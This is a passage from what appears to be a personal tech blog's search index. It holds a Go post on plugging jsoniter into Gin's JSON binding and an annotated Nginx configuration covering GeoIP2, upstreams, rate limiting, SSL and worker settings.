次。\u003c/p\u003e","tags":["URL","Go"],"title":"Go语言高性能编程手册（万字长文）"},{"categories":["URL","Go","GIN","jsoniter"],"contents":" Gin 框架绑定 JSON 参数使用 jsoniter simple go build -tags=jsoniter ./... custom implement BindingBody interface // github.com/gin-gonic/gin@v1.6.3/binding/binding.go:36 // Binding describes the interface which needs to be implemented for binding the // data present in the request such as JSON request body, query parameters or // the form POST. type Binding interface { Name() string Bind(*http.Request, interface{}) error } // BindingBody adds BindBody method to Binding. BindBody is similar with Bind, // but it reads the body from supplied bytes instead of req.Body. type BindingBody interface { Binding BindBody([]byte, interface{}) error } package custom import ( \u0026#34;bytes\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;io\u0026#34; \u0026#34;net/http\u0026#34; jsoniter \u0026#34;github.com/json-iterator/go\u0026#34; \u0026#34;github.com/gin-gonic/gin/binding\u0026#34; ) // BindingJSON 替换Gin默认的binding，支持更丰富JSON功能 var BindingJSON = jsonBinding{} // 可以自定义jsoniter配置或者添加插件 var json = jsoniter.ConfigCompatibleWithStandardLibrary type jsonBinding struct{} func (jsonBinding) Name() string { return \u0026#34;json\u0026#34; } func (jsonBinding) Bind(req *http.Request, obj interface{}) error { if req == nil || req.Body == nil { return fmt.Errorf(\u0026#34;invalid request\u0026#34;) } return decodeJSON(req.Body, obj) } func (jsonBinding) BindBody(body []byte, obj interface{}) error { return decodeJSON(bytes.NewReader(body), obj) } func decodeJSON(r io.Reader, obj interface{}) error { decoder := json.NewDecoder(r) if binding.EnableDecoderUseNumber { decoder.UseNumber() } if binding.EnableDecoderDisallowUnknownFields { decoder.DisallowUnknownFields() } if err := decoder.Decode(obj); err != nil { return err } return validate(obj) } func validate(obj interface{}) error { if binding.Validator == nil { return nil } return binding.Validator.ValidateStruct(obj) } // binding.JSON 替换成自定义的 ctx.ShouldBindWith(ms, binding.JSON) ctx.ShouldBindBodyWith(ms, binding.JSON) ","date":"November 22, 2021","hero":"/images/default-hero.jpg","permalink":"https://linzeyan.github.io/posts/20211122-go-gin-jsoniter/","summary":"\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://mp.weixin.qq.com/s/nf9OYpN3f8HMDj_xkdCzdw\" target=\"_blank\" rel=\"noopener\"\u003eGin 框架绑定 JSON 参数使用 jsoniter\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"simple\"\u003esimple\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ego build -tags\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003ejsoniter ./...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"custom\"\u003ecustom\u003c/h3\u003e\n\u003ch4 id=\"implement-bindingbody-interface\"\u003eimplement \u003ccode\u003eBindingBody\u003c/code\u003e interface\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// github.com/gin-gonic/gin@v1.6.3/binding/binding.go:36\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// Binding describes the interface which needs to be implemented for binding the\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// data present in the request such as JSON request body, query parameters or\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// the form POST.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eBinding\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eName\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eBind\u003c/span\u003e(\u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eRequest\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{}) \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// BindingBody adds BindBody method to Binding. BindBody is similar with Bind,\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// but it reads the body from supplied bytes instead of req.Body.\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eBindingBody\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eBinding\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003eBindBody\u003c/span\u003e([]\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e, \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{}) \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003epackage\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ecustom\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e (\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;bytes\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;fmt\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;io\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;net/http\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003ejsoniter\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;github.com/json-iterator/go\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;github.com/gin-gonic/gin/binding\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// BindingJSON 替换Gin默认的binding，支持更丰富JSON功能\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eBindingJSON\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ejsonBinding\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// 可以自定义jsoniter配置或者添加插件\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003evar\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e = \u003cspan style=\"color:#a6e22e\"\u003ejsoniter\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eConfigCompatibleWithStandardLibrary\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003etype\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejsonBinding\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003estruct\u003c/span\u003e{}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ejsonBinding\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eName\u003c/span\u003e() \u003cspan style=\"color:#66d9ef\"\u003estring\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;json\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ejsonBinding\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eBind\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\u003cspan style=\"color:#a6e22e\"\u003ehttp\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eRequest\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{}) \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e||\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBody\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003efmt\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eErrorf\u003c/span\u003e(\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;invalid request\u0026#34;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edecodeJSON\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ereq\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eBody\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e (\u003cspan style=\"color:#a6e22e\"\u003ejsonBinding\u003c/span\u003e) \u003cspan style=\"color:#a6e22e\"\u003eBindBody\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e []\u003cspan style=\"color:#66d9ef\"\u003ebyte\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{}) \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edecodeJSON\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebytes\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewReader\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ebody\u003c/span\u003e), \u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edecodeJSON\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eio\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eReader\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{}) \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#a6e22e\"\u003edecoder\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ejson\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eNewDecoder\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003er\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebinding\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEnableDecoderUseNumber\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003edecoder\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eUseNumber\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebinding\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eEnableDecoderDisallowUnknownFields\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#a6e22e\"\u003edecoder\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eDisallowUnknownFields\u003c/span\u003e()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e:=\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003edecoder\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eDecode\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e); \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e!=\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003eerr\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003evalidate\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efunc\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003evalidate\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003einterface\u003c/span\u003e{}) \u003cspan style=\"color:#66d9ef\"\u003eerror\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebinding\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eValidator\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e {\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#66d9ef\"\u003enil\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    }\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003ereturn\u003c/span\u003e \u003cspan style=\"color:#a6e22e\"\u003ebinding\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eValidator\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eValidateStruct\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003eobj\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e}\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-go\" data-lang=\"go\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#75715e\"\u003e// binding.JSON 替换成自定义的\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eShouldBindWith\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ems\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ebinding\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#a6e22e\"\u003ectx\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eShouldBindBodyWith\u003c/span\u003e(\u003cspan style=\"color:#a6e22e\"\u003ems\u003c/span\u003e, \u003cspan style=\"color:#a6e22e\"\u003ebinding\u003c/span\u003e.\u003cspan style=\"color:#a6e22e\"\u003eJSON\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","tags":["URL","Go","GIN","jsoniter"],"title":"Gin 框架绑定 JSON 参数使用 jsoniter"},{"categories":["Nginx"],"contents":"Record Nginx configuration file and explanation. files structure . ├── geoip.conf ├── nginx.conf ├── sites-available │ ├── default.conf ├── sites-enabled │ ├── default.conf -\u0026gt; ../sites-available/default.conf ├── upstream.conf geoip.conf ## module: ngx_http_geoip2_module ## https://github.com/leev/ngx_http_geoip2_module ## 讀取 GeoIP 資料庫，並進行變數設定 geoip2 /usr/share/GeoIP/GeoLite2-Country.mmdb { auto_reload 60m; $geoip2_metadata_country_build metadata build_epoch; ## 自定義 $geoip2_data_country_code 值為 $remote_addr 對應的 ISO 3116 規範的國碼 $geoip2_data_country_code source=$remote_addr country iso_code; ## 自定義 $geoip2_data_country_name 值為對應的英文城市名 $geoip2_data_country_name country names en; } upstream.conf ## module: ngx_http_upstream_module ## 定義 server 組別 upstream to_nodejs1 { ## server address [parameters]; 定義 server ## parameters: ## weight=number 定義權重，預設為 1 ## max_fails=number 設定到 upstream server 的最大重試次數，預設為 1 ## fail_timeout=time 設定到達 max_fails 次數之後，暫停向此 upstream server 傳送請求的時間，預設為 10 秒 ## backup 標記此 upstream server 為備用，當其他 upstream server 不可用時，此 upstream server 可接受請求 ## down 標記此 upstream server 為不可用 server 10.7.0.12:9000 max_fails=3 fail_timeout=5s; server 10.7.0.12:9001 max_fails=3 fail_timeout=5s backup; } upstream to_nodejs2 { server 10.7.0.12:9002 max_fails=3 fail_timeout=5s; server 10.7.0.12:9003 max_fails=3 fail_timeout=5s backup; } upstream to_nodejs9005 { server 10.7.0.12:9005 max_fails=3 fail_timeout=5s; } ## module: ngx_http_map_module ## map string $variable { ... } 建立一個新的變數 map $arg_agent $game_api { ## $arg_agent 請求中 agent 的值(https://abc.com/?agent=123) ## agent=123, $game_api 的值為 to_nodejs95 123 to_nodejs95; ## agent 結尾是 1, 2, 3, 或是 4, $game_api 的值為 to_nodejs1 ~*1$ to_nodejs1; ~*2$ to_nodejs1; ~*3$ to_nodejs1; ~*4$ to_nodejs1; ## 若 agent 不符合上開規則，預設 $game_api 的值為 to_nodejs2 default to_nodejs2; } default.conf ## module: ngx_http_limit_req_module ## 限制請求處理 ## limit_req_zone key zone=name:size rate=rate [sync]; 定義限制請求的規則 limit_req_zone $binary_remote_addr$server_name zone=websocket:10m rate=1r/m; ## limit_req_status code; 設定被拒絕連線的 HTTP 狀態碼，預設為 503 limit_req_status 502; ## 設定虛擬主機 server { ## listen port [default_server] [ssl] [http2 | spdy] [proxy_protocol] [setfib=number] [fastopen=number] [backlog=number] [rcvbuf=size] [sndbuf=size] [accept_filter=filter] [deferred] [bind] [ipv6only=on|off] [reuseport] [so_keepalive=on|off|[keepidle]:[keepintvl]:[keepcnt]]; ## 設定監聽的埠口，預設為 *:80 ## 下方設定為監聽 80 port，且為預設的虛擬主機 listen 80 default_server; ## server_name name ...; 設定虛擬主機名，可使用正則表示式，預設為 \u0026#34;\u0026#34; server_name _; access_log logs/default/default.log json; error_log logs/default/default.error.log warn; ## module: ngx_http_access_module ## allow address | CIDR | unix: | all; 允許 IP 訪問 allow 1.1.1.1; ## deny address | CIDR | unix: | all; 禁止 IP 訪問 deny 12.34.56.78; ## 設定請求訪問的根資料夾 root /usr/share/nginx/html; ## limit_req zone=name [burst=number] [nodelay | delay=number]; 設定限制請求的規則 zone limit_req zone=websocket nodelay; ## limit_req_log_level info | notice | warn | error; 設定被拒絕連線的請求日誌等級，預設為 error limit_req_log_level warn; ## location [ = | ~ | ~* | ^~ ] uri { ... } ## location @name { ... } 依據請求的 URI 配置 location / { default_type application/json; ## 返回 HTTP 狀態碼 200，並包含字串 return 200 \u0026#39;{\u0026#34;Code\u0026#34;: \u0026#34;$status\u0026#34;, \u0026#34;IP\u0026#34;: \u0026#34;$remote_addr\u0026#34;}\u0026#39;; } } server { ## 下方設定為監聽 443 port，且為預設的虛擬主機，所有連線都使用 SSL listen 443 default_server ssl; server_name _; access_log logs/default/default.log json; error_log logs/default/default.error.log warn; ## module: ngx_http_ssl_module ## 設定 PEM 格式的證書 ssl_certificate /etc/ssl/hddv1.com.crt; ## 設定 PEM 格式的密鑰 ssl_certificate_key /etc/ssl/hddv1.com.key; ## 設定 SSL 版本，預設為 TLSv1 TLSv1.1 TLSv1.2 ssl_protocols TLSv1.2 TLSv1.3; ## 設定啟用的加密方法，預設為 HIGH:!aNULL:!MD5 ssl_ciphers \u0026#34;EECDH+ECDSA+AESGCM:EECDH+aRSA+AESGCM:EECDH+ECDSA+SHA384:EECDH+ECDSA+SHA256:EECDH+aRSA+SHA384:EECDH+aRSA+SHA256:EECDH+aRSA+RC4:EECDH:EDH+aRSA:HIGH:!RC2:!RC4:!aNULL:!eNULL:!LOW:!IDEA:!DES:!TDES:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS:!EXPORT:!ANON\u0026#34;; ## 為 DHE 加密法指定帶有 DH 參數的文件 ssl_dhparam /etc/ssl/dhparams.pem; ## 是否優先使用 server 的加密法，預設為 off ssl_prefer_server_ciphers on; ## ssl_session_cache off | none | [builtin[:size]] [shared:name:size]; ## 設定緩存及大小，預設為 none ssl_session_cache shared:SSL:1m; ## 設定 session 可重複使用的時間，預設為 5 分鐘 ssl_session_timeout 5m; add_header X-Frame-Options \u0026#34;SAMEORIGIN\u0026#34;; add_header X-XSS-Protection \u0026#34;1; mode=block\u0026#34;; add_header Strict-Transport-Security \u0026#34;max-age=31536000; includeSubdomains; preload\u0026#34;; root /usr/share/nginx/html; limit_req zone=websocket nodelay; limit_req_log_level warn; default_type application/json; location / { default_type application/json; return 200 \u0026#39;{\u0026#34;Code\u0026#34;: \u0026#34;$status\u0026#34;, \u0026#34;IP\u0026#34;: \u0026#34;$remote_addr\u0026#34;}\u0026#39;; } } nginx.conf ## module: ngx_core_module ## worker_processes number | auto; 啟動 Nginx worker 程序數量, 設定 auto 即和 CPU 的數量相等 worker_processes auto; ## worker_rlimit_nofile number; Nginx worker 程序最大打開文件數，預設為系統 RLIMIT_NOFILE worker_rlimit_nofile 131072; ## worker_shutdown_timeout time; 設定關閉超時時間，當執行 reload 或是其他相關指令，超過 time 時間之後，Nginx 會主動關閉所有受影響的 worker worker_shutdown_timeout 60; ## error_log file [level]; 設定錯誤日誌寫入位置 ## debug, info, notice, warn, error, crit, alert, emerg error_log logs/error.log warn; ## pid file; 主程序 ID 文件位置 pid logs/nginx.pid; ## module: ngx_core_module ## 設定連線處理相關 events { ## worker_connections number; 單個 Nginx worker 程序的最大並發連接數，預設為 512，需要小於 worker_rlimit_nofile ## 最大連接數 = worker_connections * worker_processes worker_connections 102400; ## accept_mutex on | off; 